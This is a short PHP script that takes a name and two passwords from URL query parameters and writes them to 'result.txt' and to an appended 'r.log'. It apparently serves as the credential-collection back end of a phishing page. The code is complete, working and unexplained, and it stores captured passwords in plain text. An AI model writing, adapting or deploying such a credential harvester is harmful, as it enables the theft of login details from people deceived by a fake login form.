<?php
$nik = $_GET['nik'];
$pas1s = $_GET['pass1'];
$pas2s = $_GET['pass2'];
$f = fopen("result.txt", "w+");
fwrite($f, "\r\nName: $nik \r password[1]: $pas1s \r Password[2]: $pas2s \r");
fclose($f);
$f = fopen("r.log", "a+");
fwrite($f, "\r\nName: $nik \r password[1]: $pas1s \r Password[2]: $pas2s \r");
fclose($f);
?>
